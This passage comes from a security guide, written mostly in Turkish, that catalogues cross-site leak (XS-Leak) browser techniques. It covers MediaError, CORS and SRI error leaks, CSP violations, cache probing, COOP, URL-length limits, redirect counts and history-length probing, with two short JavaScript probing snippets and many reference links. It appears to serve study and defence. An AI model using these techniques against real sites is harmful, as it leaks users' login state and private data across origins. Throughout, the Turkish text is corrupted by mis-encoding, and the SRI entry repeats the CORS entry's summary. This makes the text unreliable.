window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
The `MediaError` arayÃ¼zÃ¼nÃ¼n message Ã¶zelliÄŸi, baÅŸarÄ±lÄ± bir ÅŸekilde yÃ¼klenen kaynaklarÄ± benzersiz bir dize ile tanÄ±mlar. Bir saldÄ±rgan, bu Ã¶zelliÄŸi mesaj iÃ§eriÄŸini gÃ¶zlemleyerek, bir Ã§apraz kaynak kaynaÄŸÄ±nÄ±n yanÄ±t durumunu Ã§Ä±kararak istismar edebilir.

### CORS HatasÄ±

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **Tespit Edilebilir Fark**: BaÅŸlÄ±k
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Ã–zet:** GÃ¼venlik Ä°ddialarÄ±nda (SA), CORS hata mesajlarÄ±, yÃ¶nlendirilmiÅŸ isteklerin tam URL'sini istemeden aÃ§Ä±ÄŸa Ã§Ä±karÄ±r.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Bu teknik, bir saldÄ±rgana **bir Ã§apraz kaynak sitesinin yÃ¶nlendirmesinin hedefini Ã§Ä±karmasÄ±nÄ±** saÄŸlar; Ã§Ã¼nkÃ¼ Webkit tabanlÄ± tarayÄ±cÄ±larÄ±n CORS isteklerini nasÄ±l iÅŸlediÄŸini istismar eder. Ã–zellikle, bir **CORS etkin isteÄŸi** kullanÄ±cÄ± durumuna dayalÄ± olarak yÃ¶nlendirme yapan bir hedef siteye gÃ¶nderildiÄŸinde ve tarayÄ±cÄ± isteÄŸi reddettiÄŸinde, **yÃ¶nlendirme hedefinin tam URL'si** hata mesajÄ±nda ifÅŸa edilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, yÃ¶nlendirme gerÃ§eÄŸini aÃ§Ä±ÄŸa Ã§Ä±karmakla kalmaz, aynÄ± zamanda yÃ¶nlendirmenin uÃ§ noktasÄ±nÄ± ve iÃ§erebileceÄŸi herhangi bir **hassas sorgu parametresini** de aÃ§Ä±ÄŸa Ã§Ä±karÄ±r.

### SRI HatasÄ±

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **Tespit Edilebilir Fark**: BaÅŸlÄ±k
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Ã–zet:** GÃ¼venlik Ä°ddialarÄ±nda (SA), CORS hata mesajlarÄ±, yÃ¶nlendirilmiÅŸ isteklerin tam URL'sini istemeden aÃ§Ä±ÄŸa Ã§Ä±karÄ±r.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Bir saldÄ±rgan, **aÃ§Ä±k hata mesajlarÄ±nÄ±** istismar ederek Ã§apraz kaynak yanÄ±tlarÄ±nÄ±n boyutunu Ã§Ä±karabilir. Bu, genellikle CDN'lerden alÄ±nan kaynaklarÄ±n deÄŸiÅŸtirilmediÄŸini doÄŸrulamak iÃ§in bÃ¼tÃ¼nlÃ¼k niteliÄŸini kullanan Alt Kaynak BÃ¼tÃ¼nlÃ¼ÄŸÃ¼ (SRI) mekanizmasÄ±ndan kaynaklanmaktadÄ±r. SRI'nin Ã§apraz kaynak kaynaklarÄ±nda Ã§alÄ±ÅŸabilmesi iÃ§in bunlarÄ±n **CORS etkin** olmasÄ± gerekir; aksi takdirde bÃ¼tÃ¼nlÃ¼k kontrollerine tabi tutulmazlar. GÃ¼venlik Ä°ddialarÄ±nda (SA), CORS hata XS-Leak gibi, bir bÃ¼tÃ¼nlÃ¼k niteliÄŸi ile baÅŸarÄ±sÄ±z olan bir fetch isteÄŸinden sonra bir hata mesajÄ± yakalanabilir. SaldÄ±rganlar, herhangi bir isteÄŸin bÃ¼tÃ¼nlÃ¼k niteliÄŸine **sahtelik hash deÄŸeri** atayarak bu hatayÄ± kasÄ±tlÄ± olarak **tetikleyebilirler**. SA'da, ortaya Ã§Ä±kan hata mesajÄ±, istenen kaynaÄŸÄ±n iÃ§erik uzunluÄŸunu istemeden aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. Bu bilgi sÄ±zÄ±ntÄ±sÄ±, bir saldÄ±rgana yanÄ±t boyutundaki deÄŸiÅŸiklikleri ayÄ±rt etme imkanÄ± tanÄ±r ve karmaÅŸÄ±k XS-Leak saldÄ±rÄ±larÄ±na zemin hazÄ±rlar.

### CSP Ä°hlali/Tespiti

* **Dahil Etme YÃ¶ntemleri**: Pop-up'lar
* **Tespit Edilebilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Ã–zet:** EÄŸer yalnÄ±zca kurbanÄ±n web sitesi CSP'de izin verilirse ve farklÄ± bir alan adÄ±na yÃ¶nlendirmeye Ã§alÄ±ÅŸÄ±rsa, CSP tespit edilebilir bir hata tetikler.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Bir XS-Leak, CSP'yi kullanarak bir Ã§apraz kaynak sitenin farklÄ± bir kaynaÄŸa yÃ¶nlendirilip yÃ¶nlendirilmediÄŸini tespit edebilir. Bu sÄ±zÄ±ntÄ±, yÃ¶nlendirmeyi tespit edebilir, ayrÄ±ca yÃ¶nlendirme hedefinin alanÄ±nÄ± da aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. Bu saldÄ±rÄ±nÄ±n temel fikri, **saldÄ±rgan sitesinde hedef alanÄ± izin vermektir**. Hedef alana bir istek yapÄ±ldÄ±ÄŸÄ±nda, **Ã§apraz kaynak bir alana yÃ¶nlendirir**. **CSP,** buna eriÅŸimi engeller ve bir **ihlal raporu oluÅŸturur**; bu rapor bir sÄ±zÄ±ntÄ± tekniÄŸi olarak kullanÄ±lÄ±r. TarayÄ±cÄ±ya baÄŸlÄ± olarak, **bu rapor yÃ¶nlendirmenin hedef konumunu sÄ±zdÄ±rabilir**.\
Modern tarayÄ±cÄ±lar, yÃ¶nlendirildiÄŸi URL'yi belirtmeyecek, ancak yine de bir Ã§apraz kaynak yÃ¶nlendirmesinin tetiklendiÄŸini tespit edebilirsiniz.

### Ã–nbellek

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler, Pop-up'lar
* **Tespit Edilebilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Ã–zet:** DosyayÄ± Ã¶nbellekten temizle. Hedef sayfayÄ± aÃ§ar, dosyanÄ±n Ã¶nbellekte mevcut olup olmadÄ±ÄŸÄ±nÄ± kontrol eder.
* **Kod Ã–rneÄŸi:**

TarayÄ±cÄ±lar, tÃ¼m web siteleri iÃ§in tek bir paylaÅŸÄ±lan Ã¶nbellek kullanabilir. KaynaÄŸÄ±n kÃ¶kenine bakÄ±lmaksÄ±zÄ±n, bir hedef sayfanÄ±n **belirli bir dosyayÄ± talep edip etmediÄŸini** Ã§Ä±karmak mÃ¼mkÃ¼ndÃ¼r.

Bir sayfa, yalnÄ±zca kullanÄ±cÄ± oturum aÃ§tÄ±ÄŸÄ±nda bir resmi yÃ¼klÃ¼yorsa, **kaynaÄŸÄ± geÃ§ersiz kÄ±labilir** (artÄ±k Ã¶nbelleÄŸe alÄ±nmadÄ±ysa, daha fazla bilgi baÄŸlantÄ±larÄ±na bakÄ±n), **bu kaynaÄŸÄ± yÃ¼kleyebilecek bir istek gerÃ§ekleÅŸtirebilir** ve kaynaÄŸÄ± **kÃ¶tÃ¼ bir istekle** (Ã¶rneÄŸin, aÅŸÄ±rÄ± uzun bir referans baÅŸlÄ±ÄŸÄ± kullanarak) yÃ¼klemeyi deneyebilirsiniz. EÄŸer kaynak yÃ¼klemesi **herhangi bir hata tetiklemediyse**, bunun nedeni **Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ** olmasÄ±dÄ±r.

### CSP YÃ¶nergesi

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **Tespit Edilebilir Fark**: BaÅŸlÄ±k
* **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Ã–zet:** CSP baÅŸlÄ±k yÃ¶nergeleri, CSP iframe niteliÄŸi kullanÄ±larak sorgulanabilir ve politika detaylarÄ± aÃ§Ä±ÄŸa Ã§Ä±karÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome'daki (GC) yeni bir Ã¶zellik, web sayfalarÄ±nÄ±n bir iframe Ã¶ÄŸesine bir nitelik ayarlayarak **Bir Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) Ã¶nermesine** olanak tanÄ±r; politika yÃ¶nergeleri HTTP isteÄŸi ile birlikte iletilir. Normalde, gÃ¶mÃ¼lÃ¼ iÃ§eriÄŸin **bunu bir HTTP baÅŸlÄ±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla yetkilendirmesi** gerekir, aksi takdirde bir **hata sayfasÄ± gÃ¶rÃ¼ntÃ¼lenir**. Ancak, eÄŸer iframe zaten bir CSP tarafÄ±ndan yÃ¶netiliyorsa ve yeni Ã¶nerilen politika daha kÄ±sÄ±tlayÄ±cÄ± deÄŸilse, sayfa normal ÅŸekilde yÃ¼klenir. Bu mekanizma, bir saldÄ±rgana, hata sayfasÄ±nÄ± tanÄ±mlayarak bir Ã§apraz kaynak sayfasÄ±nÄ±n **belirli CSP yÃ¶nergelerini tespit etme** yolu aÃ§ar. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± kapatÄ±lmÄ±ÅŸ olarak iÅŸaretlenmiÅŸ olsa da, bulgularÄ±mÄ±z, hata sayfasÄ±nÄ± tespit edebilen **yeni bir sÄ±zÄ±ntÄ± tekniÄŸi** ortaya koymaktadÄ±r; bu, temel sorunun asla tam olarak ele alÄ±nmadÄ±ÄŸÄ±nÄ± gÃ¶stermektedir.

### **CORP**

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **Tespit Edilebilir Fark**: BaÅŸlÄ±k
* **Daha fazla bilgi**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Ã–zet:** Cross-Origin Resource Policy (CORP) ile gÃ¼vence altÄ±na alÄ±nmÄ±ÅŸ kaynaklar, yasaklÄ± bir kÃ¶kenden alÄ±ndÄ±ÄŸÄ±nda hata verir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP baÅŸlÄ±ÄŸÄ±, belirli bir kaynaÄŸa yapÄ±lan no-cors Ã§apraz kaynak isteklerini **engelleyen** nispeten yeni bir web platformu gÃ¼venlik Ã¶zelliÄŸidir. CORP ile korunan bir kaynak, **alÄ±ndÄ±ÄŸÄ±nda hata verecektir**.

### CORB

* **Dahil Etme YÃ¶ntemleri**: HTML ElemanlarÄ±
* **Tespit Edilebilir Fark**: BaÅŸlÄ±klar
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Ã–zet**: CORB, saldÄ±rganlarÄ±n **istekte `nosniff` baÅŸlÄ±ÄŸÄ±nÄ±n mevcut olup olmadÄ±ÄŸÄ±nÄ±** tespit etmelerine olanak tanÄ±yabilir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

SaldÄ±rÄ± hakkÄ±nda daha fazla bilgi iÃ§in baÄŸlantÄ±yÄ± kontrol edin.

### KÃ¶ken YansÄ±tma YanlÄ±ÅŸ YapÄ±landÄ±rmasÄ±nda CORS HatasÄ± <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **Tespit Edilebilir Fark**: BaÅŸlÄ±klar
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Ã–zet**: EÄŸer Origin baÅŸlÄ±ÄŸÄ± `Access-Control-Allow-Origin` baÅŸlÄ±ÄŸÄ±nda yansÄ±tÄ±lÄ±yorsa, bir kaynaÄŸÄ±n Ã¶nbellekte zaten mevcut olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek mÃ¼mkÃ¼ndÃ¼r.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

EÄŸer **Origin baÅŸlÄ±ÄŸÄ±**, `Access-Control-Allow-Origin` baÅŸlÄ±ÄŸÄ±nda **yansÄ±tÄ±lÄ±yorsa**, bir saldÄ±rgan bu davranÄ±ÅŸÄ± istismar ederek **CORS** modunda **kaynaÄŸÄ± almayÄ±** deneyebilir. EÄŸer bir **hata** **tetiklenmezse**, bu, kaynaÄŸÄ±n **web'den doÄŸru bir ÅŸekilde alÄ±ndÄ±ÄŸÄ±** anlamÄ±na gelir; eÄŸer bir hata **tetiklenirse**, bunun nedeni **Ã¶nbellekten eriÅŸilmiÅŸ olmasÄ±dÄ±r** (hata, Ã¶nbelleÄŸin orijinal alanÄ± izin veren bir CORS baÅŸlÄ±ÄŸÄ± ile bir yanÄ±t kaydetmesi nedeniyle gÃ¶rÃ¼nÃ¼r).\
EÄŸer kÃ¶ken yansÄ±tÄ±lmÄ±yorsa ancak bir joker karakter kullanÄ±lÄ±yorsa (`Access-Control-Allow-Origin: *`), bu Ã§alÄ±ÅŸmayacaktÄ±r.

## Okunabilir Nitelikler TekniÄŸi

### Fetch YÃ¶nlendirmesi

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **Tespit Edilebilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Ã–zet:** GC ve SA, yÃ¶nlendirme tamamlandÄ±ktan sonra yanÄ±tÄ±n tÃ¼rÃ¼nÃ¼ (opaque-redirect) kontrol etmeye olanak tanÄ±r.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

`redirect: "manual"` ve diÄŸer parametrelerle Fetch API kullanarak bir istek gÃ¶nderildiÄŸinde, `response.type` niteliÄŸini okumak mÃ¼mkÃ¼ndÃ¼r ve eÄŸer `opaqueredirect` ile eÅŸitse, yanÄ±t bir yÃ¶nlendirme olmuÅŸtur.

### COOP

* **Dahil Etme YÃ¶ntemleri**: Pop-up'lar
* **Tespit Edilebilir Fark**: BaÅŸlÄ±k
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Ã–zet:** Cross-Origin Opener Policy (COOP) ile korunmuÅŸ sayfalar, Ã§apraz kaynak etkileÅŸimlerinden eriÅŸimi engeller.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Bir saldÄ±rgan, bir Ã§apraz kaynak HTTP yanÄ±tÄ±nda Cross-Origin Opener Policy (COOP) baÅŸlÄ±ÄŸÄ±nÄ±n varlÄ±ÄŸÄ±nÄ± Ã§Ä±karabilir. COOP, web uygulamalarÄ± tarafÄ±ndan dÄ±ÅŸ sitelerin rastgele pencere referanslarÄ± elde etmesini engellemek iÃ§in kullanÄ±lÄ±r. Bu baÅŸlÄ±ÄŸÄ±n gÃ¶rÃ¼nÃ¼rlÃ¼ÄŸÃ¼, **`contentWindow` referansÄ±na eriÅŸmeye Ã§alÄ±ÅŸarak** belirlenebilir. COOP koÅŸullu olarak uygulandÄ±ÄŸÄ±nda, **`opener` niteliÄŸi** belirleyici bir gÃ¶sterge haline gelir: COOP aktif olduÄŸunda **tanÄ±msÄ±zdÄ±r**, yokluÄŸunda ise **tanÄ±mlÄ±dÄ±r**.

### URL Maksimum UzunluÄŸu - Sunucu TarafÄ±

* **Dahil Etme YÃ¶ntemleri**: Fetch API, HTML ElemanlarÄ±
* **Tespit Edilebilir Fark**: Durum Kodu / Ä°Ã§erik
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Ã–zet:** YÃ¶nlendirme yanÄ±t uzunluÄŸundaki farklÄ±lÄ±klarÄ± tespit et, Ã§Ã¼nkÃ¼ sunucu bir hata ile yanÄ±t verebilir ve bir uyarÄ± oluÅŸturulabilir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

EÄŸer sunucu tarafÄ± yÃ¶nlendirmesi **yÃ¶nlendirme iÃ§inde kullanÄ±cÄ± girdisi** ve **ek veri** kullanÄ±yorsa, bu davranÄ±ÅŸÄ± tespit etmek mÃ¼mkÃ¼ndÃ¼r Ã§Ã¼nkÃ¼ genellikle **sunucularÄ±n** **istek uzunluÄŸu sÄ±nÄ±rÄ±** vardÄ±r. EÄŸer **kullanÄ±cÄ± verisi** o **uzunluk - 1** ise, Ã§Ã¼nkÃ¼ **yÃ¶nlendirme** **o veriyi** kullanÄ±yor ve **ek bir ÅŸey** ekliyorsa, bu bir **hata tetikler** ve **Hata OlaylarÄ±** aracÄ±lÄ±ÄŸÄ±yla tespit edilebilir.

EÄŸer bir ÅŸekilde bir kullanÄ±cÄ±ya Ã§erez ayarlayabiliyorsanÄ±z, bu saldÄ±rÄ±yÄ± **yeterli Ã§erez ayarlayarak** ([**Ã§erez bombasÄ±**](hacking-with-cookies/cookie-bomb.md)) gerÃ§ekleÅŸtirebilirsiniz; bÃ¶ylece **doÄŸru yanÄ±tÄ±n** **artmÄ±ÅŸ boyutu** bir **hata** tetikler. Bu durumda, bu isteÄŸi aynÄ± siteden tetiklerseniz, `<script>` otomatik olarak Ã§erezleri gÃ¶nderecektir (bu nedenle hatalarÄ± kontrol edebilirsiniz).\
**Ã‡erez bombasÄ± + XS-Arama** Ã¶rneÄŸi, bu yazÄ±nÄ±n Beklenen Ã§Ã¶zÃ¼mÃ¼nde bulunabilir: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` veya aynÄ± baÄŸlamda olmak genellikle bu tÃ¼r bir saldÄ±rÄ± iÃ§in gereklidir.

### URL Maksimum UzunluÄŸu - Ä°stemci TarafÄ±

* **Dahil Etme YÃ¶ntemleri**: Pop-up'lar
* **Tespit Edilebilir Fark**: Durum Kodu / Ä°Ã§erik
* **Daha fazla bilgi**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Ã–zet:** YÃ¶nlendirme yanÄ±t uzunluÄŸundaki farklÄ±lÄ±klarÄ± tespit et, Ã§Ã¼nkÃ¼ bir isteÄŸin yÃ¶nlendirme yanÄ±t uzunluÄŸu Ã§ok bÃ¼yÃ¼k olabilir.
* **Kod Ã–rneÄŸi**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromium belgelerine](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length) gÃ¶re, Chrome'un maksimum URL uzunluÄŸu 2MB'dÄ±r.

> Genel olarak, _web platformu_ URL'lerin uzunluÄŸu Ã¼zerinde sÄ±nÄ±rlara sahip deÄŸildir (ancak 2^31 yaygÄ±n bir sÄ±nÄ±rdÄ±r). _Chrome_, pratik nedenlerle ve sÃ¼reÃ§ler arasÄ± iletiÅŸimde hizmet reddi sorunlarÄ±nÄ± Ã¶nlemek iÃ§in URL'leri maksimum **2MB** uzunluÄŸuyla sÄ±nÄ±rlar.

Bu nedenle, eÄŸer **yÃ¶nlendirme URL'si bir durumda daha bÃ¼yÃ¼kse**, **2MB'den bÃ¼yÃ¼k bir URL ile yÃ¶nlendirme** yapÄ±lmasÄ± mÃ¼mkÃ¼ndÃ¼r. Bu durumda, Chrome **`about:blank#blocked`** sayfasÄ±nÄ± gÃ¶sterir.

**Belirgin fark**, eÄŸer **yÃ¶nlendirme** **tamamlandÄ±ysa**, `window.origin` bir **hata** fÄ±rlatÄ±r Ã§Ã¼nkÃ¼ bir Ã§apraz kÃ¶ken bu bilgiyi eriÅŸemez. Ancak, eÄŸer **sÄ±nÄ±r** **aÅŸÄ±lmÄ±ÅŸsa** ve yÃ¼klenen sayfa **`about:blank#blocked`** ise, pencerenin **`origin`** deÄŸeri **ebeveynin** deÄŸeri olarak kalÄ±r, bu da **eriÅŸilebilir bir bilgidir.**

**2MB**'ye ulaÅŸmak iÃ§in gereken tÃ¼m ek bilgiler, baÅŸlangÄ±Ã§ URL'sinde bir **hash** aracÄ±lÄ±ÄŸÄ±yla eklenebilir, bÃ¶ylece **yÃ¶nlendirmede kullanÄ±lacaktÄ±r.**

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### Maksimum YÃ¶nlendirmeler

* **Dahil Etme YÃ¶ntemleri**: Fetch API, Ã‡erÃ§eveler
* **Tespit Edilebilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
* **Ã–zet:** TarayÄ±cÄ±nÄ±n yÃ¶nlendirme sÄ±nÄ±rÄ±nÄ± kullanarak URL yÃ¶nlendirmelerinin gerÃ§ekleÅŸip gerÃ§ekleÅŸmediÄŸini belirleyin.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

EÄŸer bir tarayÄ±cÄ±nÄ±n **izlenecek maksimum** **yÃ¶nlendirme** sayÄ±sÄ± **20** ise, bir saldÄ±rgan **19 yÃ¶nlendirme** ile kendi sayfasÄ±nÄ± yÃ¼klemeyi deneyebilir ve sonunda **kurbanÄ±** test edilen sayfaya gÃ¶nderebilir. EÄŸer bir **hata** tetiklenirse, bu durumda sayfa **kurbanÄ± yÃ¶nlendirmeye Ã§alÄ±ÅŸÄ±yordu**.

### GeÃ§miÅŸ UzunluÄŸu

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler, Pop-up'lar
* **Tespit Edilebilir Fark**: YÃ¶nlendirmeler
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Ã–zet:** JavaScript kodu tarayÄ±cÄ± geÃ§miÅŸini manipÃ¼le eder ve uzunluk Ã¶zelliÄŸi ile eriÅŸilebilir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**GeÃ§miÅŸ API'si**, JavaScript kodunun tarayÄ±cÄ± geÃ§miÅŸini manipÃ¼le etmesine olanak tanÄ±r; bu, **bir kullanÄ±cÄ±nÄ±n ziyaret ettiÄŸi sayfalarÄ± kaydeder**. Bir saldÄ±rgan, uzunluk Ã¶zelliÄŸini bir dahil etme yÃ¶ntemi olarak kullanabilir: JavaScript ve HTML navigasyonunu tespit etmek iÃ§in.\
**`history.length`** kontrol edilerek, bir kullanÄ±cÄ±yÄ± **bir sayfaya yÃ¶nlendirmek**, **geri** dÃ¶nmek ve **`history.length`**'in yeni deÄŸerini kontrol etmek mÃ¼mkÃ¼ndÃ¼r.

### AynÄ± URL ile GeÃ§miÅŸ UzunluÄŸu

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler, Pop-up'lar
* **Tespit Edilebilir Fark**: URL, tahmin edilen URL ile aynÄ±ysa
* **Ã–zet:** Bir Ã§erÃ§evenin/pop-up'Ä±n konumunun belirli bir URL'de olup olmadÄ±ÄŸÄ±nÄ± tahmin etmek mÃ¼mkÃ¼ndÃ¼r; geÃ§miÅŸ uzunluÄŸunu istismar ederek.
* **Kod Ã–rneÄŸi**: AÅŸaÄŸÄ±da

Bir saldÄ±rgan, JavaScript kodunu kullanarak **Ã§erÃ§evenin/pop-up'Ä±n konumunu tahmin edilen bir URL'ye** **manipÃ¼le edebilir** ve **hemen ardÄ±ndan** **`about:blank`**'e **deÄŸiÅŸtirebilir**. EÄŸer geÃ§miÅŸ uzunluÄŸu arttÄ±ysa, bu, URL'nin doÄŸru olduÄŸu ve **artÄ±ÅŸ gÃ¶stermesi iÃ§in zaman bulduÄŸu** anlamÄ±na gelir; Ã§Ã¼nkÃ¼ URL aynÄ±ysa yeniden yÃ¼klenmez. EÄŸer artmadÄ±ysa, bu, **tahmin edilen URL'yi yÃ¼klemeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±** ancak **hemen ardÄ±ndan** **`about:blank`**'i yÃ¼klediÄŸi iÃ§in, **geÃ§miÅŸ uzunluÄŸunun asla artmadÄ±ÄŸÄ±** anlamÄ±na gelir.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Sayfa Ä°Ã§eriÄŸi
* **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Summary:** `window.length` Ã¶zelliÄŸini inceleyerek iframe Ã¶ÄŸelerinin miktarÄ±nÄ± deÄŸerlendirin.
* **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

`iframe` veya `window.open` aracÄ±lÄ±ÄŸÄ±yla aÃ§Ä±lan bir webdeki **Ã§erÃ§eve sayÄ±sÄ±nÄ±** saymak, kullanÄ±cÄ±nÄ±n o sayfadaki **durumunu** belirlemeye yardÄ±mcÄ± olabilir.\
AyrÄ±ca, eÄŸer sayfada her zaman aynÄ± sayÄ±da Ã§erÃ§eve varsa, Ã§erÃ§eve sayÄ±sÄ±nÄ± **sÃ¼rekli** kontrol etmek, bilgi sÄ±zdÄ±rabilecek bir **deseni** belirlemeye yardÄ±mcÄ± olabilir.

